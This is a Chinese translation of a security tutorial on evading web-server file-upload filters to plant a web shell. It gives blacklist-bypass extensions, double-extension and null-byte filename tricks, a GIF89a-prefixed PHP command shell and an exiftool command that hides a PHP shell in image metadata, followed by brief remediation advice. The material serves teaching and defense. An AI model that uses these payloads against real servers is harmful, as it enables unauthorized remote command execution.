# 绕过服务器上传限制

> 原文：<https://infosecwriteups.com/bypass-server-upload-restrictions-69054c5e1be4?source=collection_archive---------0----------------------->

## 如何使用文件在网站上获得外壳[教程]

![](img/9111589b065428dc97532f4fa4ff1776.png)

亚历山大·沙托夫在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

U ser 上传的文件可能会给黑客提供一个进入网络应用的潜在入口，这使得安全处理这些文件成为管理员和安全团队的一项极其重要的任务。如果这些文件未经正确验证，远程攻击者可能会在 web 服务器上上传恶意文件，从而导致严重的安全漏洞。恶意文件上传是不正确的文件验证的结果。这会导致代码执行。根据 ***OWASP*** 的说法，不受限制的文件上传漏洞可以允许两种不同类型的攻击。通常 web 应用程序有限制，试图使这种攻击更加困难，但黑客可以使用各种技术来击败文件上传限制，并获得反向外壳。

# 黑名单和旁路 1

黑名单是一种保护类型，在这种情况下，某些数据字符串(在许多情况下是特定的扩展名)被明确禁止发送到 web 应用服务器。这听起来像是防止危险的扩展(通常是外壳)上传到您的网站的正确解决方案，但它们并不难绕过。

这里有一些替代的扩展，可以用来绕过黑名单过滤器。

```
php.txt, .sh, .pht, .phtml, .phP, .Php, .php7, .php%00.jpeg, .cgi
```

web shells 的另一个流行扩展是 *JSP —* 这是服务器生成的网页文件。它类似于。ASP 或者。PHP 文件，但是包含 Java 代码而不是 ActiveX 或 PHP

```
.MF, .jspx, .jspf, .jsw, .jsv, xml, .war, .jsp, .aspx
```

# 白名单和旁路 2

方法二是使用白名单。白名单顾名思义，是与黑名单相反，这些服务器白名单将只接受 jpeg，gif，png，jpg 等。这听起来可能是比使用黑名单更好的保护服务器的方法，但是仍然可以使用一些技巧来绕过它。这种方法也有一些陷阱。它们是允许用户绕过这种保护的服务器端错误的记录，其中之一是:

[**IIS 6 分号漏洞**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4444) 是由一个解析器漏洞造成的，该漏洞使得用户能够上传和执行具有诸如 testing.asp 等名称的文件；。使用 jpeg 文件交换格式存储的编码图像文件扩展名

使用带有照片扩展名的反向外壳，黑客可以欺骗 web app 接受一个也带有 JPG/PNG 扩展名的 php 文件:

```
payload.php.jpg
```

同样使用*空字符注入*我们可以绕过白名单过滤器，使文件保存时字符被忽略，在禁止的扩展名和允许的扩展名之间注入空字符会导致绕过:

```
payload.php%00.jpg OR payload.php\x00.jpg
```

通常，如果白名单只接受图片，它也可以接受 ***gif*** 文件。添加**gif 89 a；**到您的 shell 的最顶层可能会帮助您绕过限制，让您执行 shell。

```
GIF89a; <?php system($_GET['cmd']); ?>
```

# Exif 数据、ExifTool 和旁路 3

下一种绕过文件上传限制的方法是利用任何图像中的 Exif 数据，比如位置、名称、使用的相机等等。每当上传图像时，web 应用程序可以执行插入包含反向外壳有效载荷的注释。

你可以使用像 **exiftool** 这样的工具添加你的有效载荷

将一个简短的命令 shell 作为信息插入到您的照片中可能看起来像这样:

```
$ exiftool -DocumentName="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" pwtoken.jpeg
```

您可以使用 **Exiftool** 查看照片中新添加的评论。

```
$ exiftool pwtoken.jpeg
```

然后只需添加一个 ***shell*** 扩展名，使其成为 web app server 中的一次可执行文件:

```
$ mv catphoto.jpg catphoto.php\x00.jpg
```

将它与本文开头提到的方法一起使用，绕过黑名单和/或白名单。

# 补救

限制可上传的文件类型:检查文件扩展名，只允许上传某些文件。使用白名单而不是黑名单。检查双扩展名，如. php.png。检查没有文件名的文件，如。htaccess(在 ASP.NET 上，检查 web.config 之类的配置文件)。更改上传文件夹的权限，使其中的文件不可执行。如果可能，重命名上传的文件。